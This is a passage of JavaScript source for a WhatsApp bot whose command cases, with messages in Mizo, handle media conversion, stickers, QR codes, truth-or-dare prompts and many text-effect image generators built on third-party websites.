} else if (args[0] == 'open') {
HBWABotInc.groupSettingUpdate(from, 'not_announcement')
replyherbertstyle(`He group hi participants zawng zawngten message thawn thei tawh tura dah a ni e....✓`)
} else {
replyherbertstyle(`Option te khu hmang rawh\nOptions : Close & Open\nTiang hian : ${command} close`)
}}
break
case 'tomp4': case 'tovideo': {
                if (!quoted) return replyherbertstyle('Reply to Sticker')
                if (!/webp/.test(mime)) return replyherbertstyle(`Sticker reply rawh tiang hian:  *${prefix + command}*`)
                await loading()
		        let { webp2mp4File } = require('./lib/uploader')
                let media = await HBWABotInc.downloadAndSaveMediaMessage(quoted)
                let webpToMp4 = await webp2mp4File(media)
                await HBWABotInc.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'sticker a tang video ah convert a ni' } }, { quoted: m })
                await fs.unlinkSync(media)
                
            }
            break
            case 'toaud': case 'toaudio': {
            if (!/video/.test(mime) && !/audio/.test(mime)) return replyherbertstyle(`Send/Reply in Video/Audio rawn thawn rawh tiang hian: ${prefix + command}`)
            if (!quoted) return replyherbertstyle(`Send/Reply in Video/Audio rawn thawn rawh tiang hian: ${prefix + command}`)
            await loading()
            let media = await quoted.download()
            let { toAudio } = require('./lib/converter')
            let audio = await toAudio(media, 'mp4')
            HBWABotInc.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
            
            }
            break
            case 'tomp3': {
            if (/document/.test(mime)) return replyherbertstyle(`Send/Reply in Video/Audio rawn thawn rawh tiang hian: ${prefix + command}`)
            if (!/video/.test(mime) && !/audio/.test(mime)) return replyherbertstyle(`Send/Reply in Video/Audio rawn thawn rawh tiang hian: ${prefix + command}`)
            if (!quoted) return replyherbertstyle(`Send/Reply in Video/Audio rawn thawn rawh tiang hian: ${prefix + command}`)
            await loading()
            let media = await quoted.download()
            let { toAudio } = require('./lib/converter')
            let audio = await toAudio(media, 'mp4')
            HBWABotInc.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By ${HBWABotInc.user.name}.mp3`}, { quoted : m })
            
            }
            break
            case 'tovn': case 'toptt': {
            if (!/video/.test(mime) && !/audio/.test(mime)) return replyherbertstyle(`Send/Reply in Video/Audio rawn thawn rawh tiang hian: ${prefix + command}`)
            if (!quoted) return replyherbertstyle(`Send/Reply in Video/Audio rawn thawn rawh tiang hian: ${prefix + command}`)
            await loading()
            let media = await quoted.download()
            let { toPTT } = require('./lib/converter')
            let audio = await toPTT(media, 'mp4')
            HBWABotInc.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
            
            }
            break
            case 'togif': {
                if (!quoted) return replyherbertstyle('Reply video')
                if (!/webp/.test(mime)) return replyherbertstyle(`Sticker reply rawh tiang hian: *${prefix + command}*`)
                await loading()
		let { webp2mp4File } = require('./lib/uploader')
                let media = await HBWABotInc.downloadAndSaveMediaMessage(quoted)
                let webpToMp4 = await webp2mp4File(media)
                await HBWABotInc.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted: m })
                await fs.unlinkSync(media)
                
            }
            break

case 'tourl': case 'tolink': {
if (!quoted) return replyherbertstyle(`Thlalak a caption-ah *${prefix + command}* tih rawn dah rawh`)
if (!/image/.test(mime)) return replyherbertstyle(`Thlalak rawn thawn la emaw reply la, a caption-ah ${prefix + command} tih hi rawn dah rawh`)
let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
let media = await HBWABotInc.downloadAndSaveMediaMessage(quoted)
let anu = await TelegraPh(media)
let hmantur = util.format(anu)
var HBLoadingmenu = [
`《▒▒▒▒▒▒▒▒▒▒▒▒》0%`,
`《█▒▒▒▒▒▒▒▒▒▒▒》10%`,
`《████▒▒▒▒▒▒▒▒》30%`,
`《███████▒▒▒▒▒》50%`,
`《██████████▒▒》80%`,
`《████████████》100%`,
`Hei le\n${hmantur}`]

let { key } = await HBWABotInc.sendMessage(from, {text: '《▒▒▒▒▒▒▒▒▒▒▒▒》0%\n♻️ _Nghak lawk rawh.._'},{quoted:m})

for (let i = 0; i < HBLoadingmenu.length; i++) {await HBWABotInc.sendMessage(from, {text: HBLoadingmenu[i], edit: key },{quoted:m})}
await fs.unlinkSync(media)
}
break

            case 'toqr':{
  if (!q) return replyherbertstyle(' Link emaw text rawn dah rawh')
   const QrCode = require('qrcode-reader')
   const qrcode = require('qrcode')
   let qyuer = await qrcode.toDataURL(q, { scale: 35 })
   let data = new Buffer.from(qyuer.replace('data:image/png;base64,', ''), 'base64')
   let buff = getRandom('.jpg')
   await fs.writeFileSync('./'+buff, data)
   let medi = fs.readFileSync('./' + buff)
  await HBWABotInc.sendMessage(from, { image: medi, caption:"\n*©HBWABot*"}, { quoted: m })
   setTimeout(() => { fs.unlinkSync(buff) }, 10000)
  }
  break
case 'dare': { 
if (!m.isGroup) return m.reply(mess.group)
var truthordare = await getBuffer(`https://i.imgur.com/hnH7qf0.jpeg`)
const dare = await fetchJson('https://raw.githubusercontent.com/HBMods-OFC/Media/main/Games/dare.json')
const herbertdare = dare[Math.floor(Math.random() * dare.length)]
HBWABotInc.sendMessage(from, { 
text: ` *DARE I THLANGA*\n${herbertdare}\n\n____________`,
contextInfo:{
        externalAdReply:{ 
            showAdAttribution: true,
            containsAutoReply: true,
            title: 'Truth or Dare',
            body: 'Fun Game',
            thumbnail: truthordare,
            mediaType: 2,
            mediaUrl: `https://www.youtube.com/@HBMods_Channel`,
            sourceUrl: `https://www.youtube.com/@HBMods_Channel`
}
}
},{quoted:m})
}
break

case 'truth': { 
if (!m.isGroup) return m.reply(mess.group)
var truthordare = await getBuffer(`https://i.imgur.com/hnH7qf0.jpeg`)
const truth = await fetchJson('https://raw.githubusercontent.com/HBMods-OFC/Media/main/Games/truth.json')
const herberttruth = truth[Math.floor(Math.random() * truth.length)]
HBWABotInc.sendMessage(from, { 
text: ` *TRUTH I THLANGA*\n${herberttruth}\n\n____________`,
contextInfo:{
        externalAdReply:{ 
            showAdAttribution: true,
            containsAutoReply: true,
            title: 'Truth or Dare',
            body: 'Fun Game',
            thumbnail: truthordare,
            mediaType: 2,
            mediaUrl: `https://www.youtube.com/@HBMods_Channel`,
            sourceUrl: `https://www.youtube.com/@HBMods_Channel`
}
}
},{quoted:m})
}
break
case 'toimg': case 'thlalakk': {
	await loading()
	const getRandom = (ext) => {
            return `${Math.floor(Math.random() * 10000)}${ext}`
        }
        if (!m.quoted) return replyherbertstyle(`Tiangkhan sticker rawn reply rawh`)
        let mime = m.quoted.mtype
if (mime =="imageMessage" || mime =="stickerMessage")
{
        let media = await HBWABotInc.downloadAndSaveMediaMessage(m.quoted)
        let name = await getRandom('.png')
        exec(`ffmpeg -i ${media} ${name}`, (err) => {
        	fs.unlinkSync(media)
            let buffer = fs.readFileSync(name)
            HBWABotInc.sendMessage(m.chat, { image: buffer }, { quoted: m })      
fs.unlinkSync(name)

        })
        
} else return replyherbertstyle(`Sticker che thei lo ang chi rawn reply rawh`)
    }
    break 
case 'swm': case 'steal': case 'stickerwm': case 'take':{
if (!isPrem) return replyprem(mess.premium)
if (!args.join(" ")) return replyherbertstyle(`word rawn dah rawh`)
const swn = args.join(" ")
const pcknm = swn.split("|")[0]
const atnm = swn.split("|")[1]
if (m.quoted.isAnimated === true) {
HBWABotInc.downloadAndSaveMediaMessage(quoted, "gifee")
HBWABotInc.sendMessage(from, {sticker:fs.readFileSync("gifee.webp")},{quoted:m})
} else if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await HBWABotInc.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return replyherbertstyle('Second 10 aia tam a thei loh!')
let media = await quoted.download()
let encmedia = await HBWABotInc.sendVideoAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else {
replyherbertstyle(`Photo/Video?`)
}
}
break
case 'qc': case'text': {
    if (!args[0] && !m.quoted) {
      return replyherbertstyle(`word rawn dah rawh`)
    }
    let userPfp
    if (m.quoted) {
      try {
        userPfp = await HBWABotInc.profilePictureUrl(m.quoted.sender, "image")
      } catch (e) {
        userPfp = defaultpp
      }
    } else {
      try {
        userPfp = await HBWABotInc.profilePictureUrl(m.sender, "image")
      } catch (e) {
        userPfp = defaultpp
      }
    }
    const waUserName = pushname
    const quoteText = m.quoted ? m.quoted.body : args.join(" ")
    const quoteJson = {
      type: "quote",
      format: "png",
      backgroundColor: "#FFFFFF",
      width: 700,
      height: 580,
      scale: 2,
      messages: [
        {
          entities: [],
          avatar: true,
          from: {
            id: 1,
            name: waUserName,
            photo: {
              url: userPfp,
            },
          },
          text: quoteText,
          replyMessage: {},
        },
      ],
    }
    try {
      const quoteResponse = await axios.post("https://bot.lyo.su/quote/generate", quoteJson, {
        headers: { "Content-Type": "application/json" },
      })
      const buffer = Buffer.from(quoteResponse.data.result.image, "base64")
      HBWABotInc.sendImageAsSticker(m.chat, buffer, m, {
        packname: packname,
        author: author,
      })
    } catch (error) {
      console.error(error)
      replyherbertstyle('Error')
    }
    }
    break
case 's': case 'sticker': case 'stiker': { 
if (!quoted) return replyherbertstyle(`(picture emaw video emaw gif) te hi thawn in emaw reply la, a caption-ah *${prefix+command}* tiin rawn dah rawh`)
if (/image/.test(mime)) { 
let media = await quoted.download()
let encmedia = await HBWABotInc.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })

} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return replyherbertstyle('Video chu second 10 aia tam sticker in siam thei a ni lo')
let media = await quoted.download()
let encmedia = await HBWABotInc.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })

} else {
replyherbertstyle(`(picture emaw video emaw gif) te hi thawn in emaw reply la, a caption-ah *${prefix+command}* tiin rawn dah rawh`)
}
}
break
case 'candy': 
case 'christmas': 
case '3dchristmas': 
case 'sparklechristmas':
case 'deepsea': 
case 'scifi': 
case 'rainbow': 
case 'waterpipe': 
case 'spooky': 
case 'pencil': 
case 'circuit': 
case 'discovery': 
case 'metalic': 
case 'fiction': 
case 'demon': 
case 'transformer': 
case 'berry': 
case 'thunder': 
case 'magma': 
case '3dstone': 
case 'neonlight': 
case 'glitch': 
case 'harrypotter': 
case 'brokenglass': 
case 'papercut': 
case 'watercolor': 
case 'multicolor': 
case 'neondevil': 
case 'underwater': 
case 'graffitibike':
case 'snow': 
case 'cloud': 
case 'honey': 
case 'ice': 
case 'fruitjuice': 
case 'biscuit': 
case 'wood': 
case 'chocolate': 
case 'strawberry': 
case 'matrix': 
case 'blood': 
case 'dropwater': 
case 'toxic': 
case 'lava': 
case 'rock': 
case 'bloodglas': 
case 'hallowen': 
case 'darkgold': 
case 'joker': 
case 'wicker':
case 'firework': 
case 'skeleton': 
case 'blackpink': 
case 'sand': 
case 'glue': 
case '1917': 
case 'leaves': {

if (!q) return replyherbertstyle(`Tiang hian tih tur : ${prefix+command} Hello World`) 
await makerreact()
let link
if (/candy/.test(command)) link = 'https://textpro.me/create-christmas-candy-cane-text-effect-1056.html'
if (/christmas/.test(command)) link = 'https://textpro.me/christmas-tree-text-effect-online-free-1057.html'
if (/3dchristmas/.test(command)) link = 'https://textpro.me/3d-christmas-text-effect-by-name-1055.html'
if (/sparklechristmas/.test(command)) link = 'https://textpro.me/sparkles-merry-christmas-text-effect-1054.html'
if (/deepsea/.test(command)) link = 'https://textpro.me/create-3d-deep-sea-metal-text-effect-online-1053.html'
if (/scifi/.test(command)) link = 'https://textpro.me/create-3d-sci-fi-text-effect-online-1050.html'
if (/rainbow/.test(command)) link = 'https://textpro.me/3d-rainbow-color-calligraphy-text-effect-1049.html'
if (/waterpipe/.test(command)) link = 'https://textpro.me/create-3d-water-pipe-text-effects-online-1048.html'
if (/spooky/.test(command)) link = 'https://textpro.me/create-halloween-skeleton-text-effect-online-1047.html'
if (/pencil/.test(command)) link = 'https://textpro.me/create-a-sketch-text-effect-online-1044.html'
if (/circuit/.test(command)) link = 'https://textpro.me/create-blue-circuit-style-text-effect-online-1043.html'
if (/discovery/.test(command)) link = 'https://textpro.me/create-space-text-effects-online-free-1042.html'
if (/metalic/.test(command)) link = 'https://textpro.me/creat-glossy-metalic-text-effect-free-online-1040.html'
if (/fiction/.test(command)) link = 'https://textpro.me/create-science-fiction-text-effect-online-free-1038.html'
if (/demon/.test(command)) link = 'https://textpro.me/create-green-horror-style-text-effect-online-1036.html'
if (/transformer/.test(command)) link = 'https://textpro.me/create-a-transformer-text-effect-online-1035.html'
if (/berry/.test(command)) link = 'https://textpro.me/create-berry-text-effect-online-free-1033.html'
if (/thunder/.test(command)) link = 'https://textpro.me/online-thunder-text-effect-generator-1031.html'
if (/magma/.test(command)) link = 'https://textpro.me/create-a-magma-hot-text-effect-online-1030.html'
if (/3dstone/.test(command)) link = 'https://textpro.me/3d-stone-cracked-cool-text-effect-1029.html'
if (/neonlight/.test(command)) link = 'https://textpro.me/create-3d-neon-light-text-effect-online-1028.html'
if (/glitch/.test(command)) link = 'https://textpro.me/create-impressive-glitch-text-effects-online-1027.html'
if (/harrypotter/.test(command)) link = 'https://textpro.me/create-harry-potter-text-effect-online-1025.html'
if (/brokenglass/.test(command)) link = 'https://textpro.me/broken-glass-text-effect-free-online-1023.html'
if (/papercut/.test(command)) link = 'https://textpro.me/create-art-paper-cut-text-effect-online-1022.html'
if (/watercolor/.test(command)) link = 'https://textpro.me/create-a-free-online-watercolor-text-effect-1017.html'
if (/multicolor/.test(command)) link = 'https://textpro.me/online-multicolor-3d-paper-cut-text-effect-1016.html'
if (/neondevil/.test(command)) link = 'https://textpro.me/create-neon-devil-wings-text-effect-online-free-1014.html'
if (/underwater/.test(command)) link = 'https://textpro.me/3d-underwater-text-effect-generator-online-1013.html'
if (/graffitibike/.test(command)) link = 'https://textpro.me/create-wonderful-graffiti-art-text-effect-1011.html'
if (/snow/.test(command)) link = 'https://textpro.me/create-snow-text-effects-for-winter-holidays-1005.html'
if (/cloud/.test(command)) link = 'https://textpro.me/create-a-cloud-text-effect-on-the-sky-online-1004.html'
if (/honey/.test(command)) link = 'https://textpro.me/honey-text-effect-868.html'
if (/ice/.test(command)) link = 'https://textpro.me/ice-cold-text-effect-862.html'
if (/fruitjuice/.test(command)) link = 'https://textpro.me/fruit-juice-text-effect-861.html'
if (/biscuit/.test(command)) link = 'https://textpro.me/biscuit-text-effect-858.html'
if (/wood/.test(command)) link = 'https://textpro.me/wood-text-effect-856.html'
if (/chocolate/.test(command)) link = 'https://textpro.me/chocolate-cake-text-effect-890.html'
if (/strawberry/.test(command)) link = 'https://textpro.me/strawberry-text-effect-online-889.html'
if (/matrix/.test(command)) link = 'https://textpro.me/matrix-style-text-effect-online-884.html'
if (/blood/.test(command)) link = 'https://textpro.me/horror-blood-text-effect-online-883.html'
if (/dropwater/.test(command)) link = 'https://textpro.me/dropwater-text-effect-872.html'
if (/toxic/.test(command)) link = 'https://textpro.me/toxic-text-effect-online-901.html'
if (/lava/.test(command)) link = 'https://textpro.me/lava-text-effect-online-914.html'
if (/rock/.test(command)) link = 'https://textpro.me/rock-text-effect-online-915.html'
if (/bloodglas/.test(command)) link = 'https://textpro.me/blood-text-on-the-frosted-glass-941.html'
if (/hallowen/.test(command)) link = 'https://textpro.me/halloween-fire-text-effect-940.html'
if (/darkgold/.test(command)) link = 'https://textpro.me/metal-dark-gold-text-effect-online-939.html'
if (/joker/.test(command)) link = 'https://textpro.me/create-logo-joker-online-934.html'
if (/wicker/.test(command)) link = 'https://textpro.me/wicker-text-effect-online-932.html'
if (/firework/.test(command)) link = 'https://textpro.me/firework-sparkle-text-effect-930.html'
if (/skeleton/.test(command)) link = 'https://textpro.me/skeleton-text-effect-online-929.html'
if (/blackpink/.test(command)) link = 'https://textpro.me/create-blackpink-logo-style-online-1001.html'
if (/sand/.test(command)) link = 'https://textpro.me/write-in-sand-summer-beach-free-online-991.html'
if (/glue/.test(command)) link = 'https://textpro.me/create-3d-glue-text-effect-with-realistic-style-986.html'
if (/1917/.test(command)) link = 'https://textpro.me/1917-style-text-effect-online-980.html'
if (/leaves/.test(command)) link = 'https://textpro.me/natural-leaves-text-effect-931.html'
let anu = await mumaker.textpro(link, q)
HBWABotInc.sendMessage(m.chat, { image: {url: anu.image}, caption: `${"\n*©HBWABot*"}` }, { quoted: m })
await finishreact()
}
break
case 'glitchtext':
case 'writetext':
case 'advancedglow':
case 'typographytext':
case 'pixelglitch':
case 'neonglitch':
case 'flagtext':
case 'flag3dtext':
case 'deletingtext':
case 'blackpinkstyle':
case 'glowingtext':
case 'underwatertext':
case 'logomaker':
case 'cartoonstyle':
case 'papercutstyle':
case 'watercolortext':
case 'effectclouds':
case 'blackpinklogo':
case 'gradienttext':
case 'summerbeach':
case 'luxurygold':
case 'multicoloredneon':
case 'sandsummer':
case 'galaxywallpaper':
case '1917style':
case 'makingneon':
case 'royaltext':
case 'freecreate':
case 'galaxystyle':
case 'lighteffects':{

if (!q) return replyherbertstyle(`Tiang hian tih tur : ${prefix+command} Hello World`) 
await makerreact()
let link
if (/glitchtext/.test(command)) link = 'https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html'
if (/writetext/.test(command)) link = 'https://en.ephoto360.com/write-text-on-wet-glass-online-589.html'
if (/advancedglow/.test(command)) link = 'https://en.ephoto360.com/advanced-glow-effects-74.html'
if (/typographytext/.test(command)) link = 'https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html'
if (/pixelglitch/.test(command)) link = 'https://en.ephoto360.com/create-pixel-glitch-text-effect-online-769.html'
if (/neonglitch/.test(command)) link = 'https://en.ephoto360.com/create-impressive-neon-glitch-text-effects-online-768.html'
if (/flagtext/.test(command)) link = 'https://en.ephoto360.com/nigeria-3d-flag-text-effect-online-free-753.html'
if (/flag3dtext/.test(command)) link = 'https://en.ephoto360.com/free-online-american-flag-3d-text-effect-generator-725.html'
if (/deletingtext/.test(command)) link = 'https://en.ephoto360.com/create-eraser-deleting-text-effect-online-717.html'
if (/blackpinkstyle/.test(command)) link = 'https://en.ephoto360.com/online-blackpink-style-logo-maker-effect-711.html'
if (/glowingtext/.test(command)) link = 'https://en.ephoto360.com/create-glowing-text-effects-online-706.html'
if (/underwatertext/.test(command)) link = 'https://en.ephoto360.com/3d-underwater-text-effect-online-682.html'
if (/logomaker/.test(command)) link = 'https://en.ephoto360.com/free-bear-logo-maker-online-673.html'
if (/cartoonstyle/.test(command)) link = 'https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html'
if (/papercutstyle/.test(command)) link = 'https://en.ephoto360.com/multicolor-3d-paper-cut-style-text-effect-658.html'
if (/watercolortext/.test(command)) link = 'https://en.ephoto360.com/create-a-watercolor-text-effect-online-655.html'
if (/effectclouds/.test(command)) link = 'https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html'
if (/blackpinklogo/.test(command)) link = 'https://en.ephoto360.com/create-blackpink-logo-online-free-607.html'
if (/gradienttext/.test(command)) link = 'https://en.ephoto360.com/create-3d-gradient-text-effect-online-600.html'
if (/summerbeach/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html'
if (/luxurygold/.test(command)) link = 'https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html'
if (/multicoloredneon/.test(command)) link = 'https://en.ephoto360.com/create-multicolored-neon-light-signatures-591.html'
if (/sandsummer/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html'
if (/galaxywallpaper/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-wallpaper-mobile-online-528.html'
if (/1917style/.test(command)) link = 'https://en.ephoto360.com/1917-style-text-effect-523.html'
if (/makingneon/.test(command)) link = 'https://en.ephoto360.com/making-neon-light-text-effect-with-galaxy-style-521.html'
if (/royaltext/.test(command)) link = 'https://en.ephoto360.com/royal-text-effect-online-free-471.html'
if (/freecreate/.test(command)) link = 'https://en.ephoto360.com/free-create-a-3d-hologram-text-effect-441.html'
if (/galaxystyle/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html'
if (/lighteffects/.test(command)) link = 'https://en.ephoto360.com/create-light-effects-green-neon-online-429.html'
let haldwhd = await ephoto(link, q)
HBWABotInc.sendMessage(m.chat, { image: { url: haldwhd }, caption: `${"\n*©HBWABot*"}` }, { quoted: m })
await finishreact()
}
break
case 'shadow': 
case 'write': 
case 'romantic': 
case 'burnpaper':
case 'smoke': 
case 'narutobanner': 
case 'love': 
case 'undergrass':
case 'doublelove': 
case 'coffecup':
case 'underwaterocean':
case 'smokyneon':
case 'starstext':
case 'rainboweffect':
case 'balloontext':
case 'metalliceffect':
case 'embroiderytext':
case 'flamingtext':
case 'stonetext':
case 'writeart':
case 'summertext':
case 'wolfmetaltext':
case 'nature3dtext':
case 'rosestext':
case 'naturetypography':
case 'quotesunder':
case 'shinetext':{

if (!q) return replyherbertstyle(`Tiang hian tih tur : ${prefix+command} Hello World`) 
await makerreact()
let link
if (/stonetext/.test(command)) link = 'https://photooxy.com/online-3d-white-stone-text-effect-utility-411.html'
if (/writeart/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-art-quote-on-wood-heart-370.html'
if (/summertext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/3d-summer-text-effect-367.html'
if (/wolfmetaltext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-a-wolf-metal-text-effect-365.html'
if (/nature3dtext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/make-nature-3d-text-effects-364.html'
if (/rosestext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/yellow-roses-text-360.html'
if (/naturetypography/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-vector-nature-typography-355.html'
if (/quotesunder/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/quotes-under-fall-leaves-347.html'
if (/shinetext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/rainbow-shine-text-223.html'
if (/shadow/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/shadow-text-effect-in-the-sky-394.html'
if (/write/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-text-on-the-cup-392.html'
if (/romantic/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/romantic-messages-for-your-loved-one-391.html'
if (/burnpaper/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-text-on-burn-paper-388.html'
if (/smoke/.test(command)) link = 'https://photooxy.com/other-design/create-an-easy-smoke-type-effect-390.html'
if (/narutobanner/.test(command)) link = 'https://photooxy.com/manga-and-anime/make-naruto-banner-online-free-378.html'
if (/love/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-a-picture-of-love-message-377.html'
if (/undergrass/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/make-quotes-under-grass-376.html'
if (/doublelove/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/love-text-effect-372.html'
if (/coffecup/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/put-any-text-in-to-coffee-cup-371.html'
if (/underwaterocean/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/creating-an-underwater-ocean-363.html'
if (/smokyneon/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/make-smoky-neon-glow-effect-343.html'
if (/starstext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-stars-text-on-the-night-sky-200.html'
if (/rainboweffect/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/glow-rainbow-effect-generator-201.html'
if (/balloontext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/royal-look-text-balloon-effect-173.html'
if (/metalliceffect/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/illuminated-metallic-effect-177.html'
if (/embroiderytext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-embroidery-text-online-191.html'
if (/flamingtext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/realistic-flaming-text-effect-online-197.html'
let dehe = await photooxy.photoOxy(link, q)
HBWABotInc.sendMessage(m.chat, { image: { url: dehe }, caption: `${"\n*©HBWABot*"}` }, { quoted: m })
await finishreact()
}
break
case 'pornhub':{
if(!q) return replyherbertstyle(`Tiang hian tih tur : ${prefix + command} Herbert|Suantak`)
await makerreact()
  inilogo4 = args.join(" ")
inilogo9 = args.join(" ")
   var logo4 = inilogo4.split('|')[0]
var logo9 = inilogo9.split('|')[1]
    let anuphub = await mumaker.textpro("https://textpro.me/pornhub-style-logo-online-generator-free-977.html", [`${logo4}`,`${logo9}`])
console.log(anuphub)
HBWABotInc.sendMessage(from,{image:{url:anuphub.image}, caption:"\n*©HBWABot*"},{quoted:m})
await finishreact()
}
break
case 'retro':{
if(!q) return replyherbertstyle(`Tiang hian tih tur : ${prefix + command} Herbert|Suantak`)
await makerreact()
  inilogo4 = args.join(" ")
inilogo9 = args.join(" ")
   var logo4 = inilogo4.split('|')[0]
var logo9 = inilogo9.split('|')[1]
    let anutro2 = await mumaker.textpro("https://textpro.me/create-3d-retro-text-effect-online-free-1065.html", [`${logo4}`,`${logo9}`])
console.log(anutro2)
HBWABotInc.sendMessage(from,{image:{url:anutro2.image}, caption:"\n*©HBWABot*"},{quoted:m})
await finishreact()
}
break
case '8bit':{
if(!q) return replyherbertstyle(`Tiang hian tih tur : ${prefix + command} Herbert|Suantak`)
await makerreact()
  inilogo4 = args.join(" ")
inilogo9 = args.join(" ")
   var logo4 = inilogo4.split('|')[0]
var logo9 = inilogo9.split('|')[1]
    let anubit8 = await mumaker.textpro("https://textpro.me/video-game-classic-8-bit-text-effect-1037.html", [`${logo4}`,`${logo9}`])
console.log(anubit8)
HBWABotInc.sendMessage(from,{image:{url:anubit8.image}, caption:"\n*©HBWABot*"},{quoted:m})
await finishreact()
}
break
case 'batman':
if(!q) return replyherbertstyle(`Tiang hian tih tur : ${prefix + command} Hello World`)
await makerreact()
maker.textpro("https://textpro.me/make-a-batman-logo-online-free-1066.html", [
    `${q}`,])
  .then((data) => HBWABotInc.sendMessage(m.chat, { image: {url: data.image},caption: `A genarate-tu hi ${global.botname} ka ni e.!! ` }, { quoted: m }))
  await finishreact()
  .catch((err) => console.log(err))
   break
case '3dbox':
if(!q) return replyherbertstyle(`Tiang hian tih tur : ${prefix + command} Hello World`)
await makerreact()
maker.textpro("https://textpro.me/3d-box-text-effect-online-880.html", [
    `${q}`,])
.then((data) => HBWABotInc.sendMessage(m.chat, { image: {url: data.image},caption: `A genarate-tu hi ${global.botname} ka ni e.!! ` }, { quoted: m }))
await finishreact()
.catch((err) => console.log(err));
break
case 'letteringeffect':
if(!q) return replyherbertstyle(`Tiang hian tih tur : ${prefix + command} Hello World`)
await makerreact()
maker.ephoto("https://en.ephoto360.com/flame-lettering-effect-372.html", [
    `${q}`,])
.then((data) => HBWABotInc.sendMessage(m.chat, { image: {url: data.image},caption: `A genarate-tu hi ${global.botname} ka ni e.!! ` }, { quoted: m }))
await finishreact()
.catch((err) => console.log(err));
break
case 'lion':
if(!q) return replyherbertstyle(`Tiang hian tih tur : ${prefix + command} Herbert|Suantak`)
await makerreact()
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
 mumaker.textpro("https://textpro.me/create-lion-logo-mascot-online-938.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => HBWABotInc.sendMessage(m.chat, { image: {url: data.image},caption: `A genarate-tu hi ${global.botname} ka ni e.!! ` }, { quoted: m }))
  await finishreact()
  .catch((err) => console.log(err));
   break
   case '3davengers':
if(!q) return replyherbertstyle(`Tiang hian tih tur : ${prefix + command} Herbert|Suantak`)
await makerreact()
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
 mumaker.textpro("https://textpro.me/create-3d-avengers-logo-online-974.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => HBWABotInc.sendMessage(m.chat, { image: {url: data.image},caption: `A genarate-tu hi ${global.botname} ka ni e.!! ` }, { quoted: m }))
  await finishreact()
  .catch((err) => console.log(err));
   break
case 'window':
if(!q) return replyherbertstyle(`Tiang hian tih tur : ${prefix + command} Hello World`)
await makerreact()
 mumaker.textpro("https://textpro.me/write-text-on-foggy-window-online-free-1015.html", [
    `${q}`,])
  .then((data) => HBWABotInc.sendMessage(m.chat, { image: {url: data.image},caption: `A genarate-tu hi ${global.botname} ka ni e.!! ` }, { quoted: m }))
  await finishreact()
  .catch((err) => console.log(err));
   break
case '3dspace':
if(!q) return replyherbertstyle(`Tiang hian tih tur : ${prefix + command} Herbert|Suantak`)
await makerreact()
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
 mumaker.textpro("https://textpro.me/create-space-3d-text-effect-online-985.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => HBWABotInc.sendMessage(m.chat, { image: {url: data.image},caption: `A genarate-tu hi ${global.botname} ka ni e.!! ` }, { quoted: m }))
  await finishreact()
  .catch((err) => console.log(err));
   break
case 'bokeh':
if(!q) return replyherbertstyle(`Tiang hian tih tur : ${prefix + command} Hello World`)
await makerreact()
 mumaker.textpro("https://textpro.me/bokeh-text-effect-876.html", [
    `${q}`,])
  .then((data) => HBWABotInc.sendMessage(m.chat, { image: {url: data.image},caption: `A genarate-tu hi ${global.botname} ka ni e.!! ` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'holographic':
if(!q) return replyherbertstyle(`Tiang hian tih tur : ${prefix + command} Hello World`)
await makerreact()
 mumaker.textpro("https://textpro.me/holographic-3d-text-effect-975.html", [
    `${q}`,])
  .then((data) => HBWABotInc.sendMessage(m.chat, { image: {url: data.image},caption: `A genarate-tu hi ${global.botname} ka ni e.!! ` }, { quoted: m }))
  await finishreact()
  .catch((err) => console.log(err));
   break
case 'thewall':
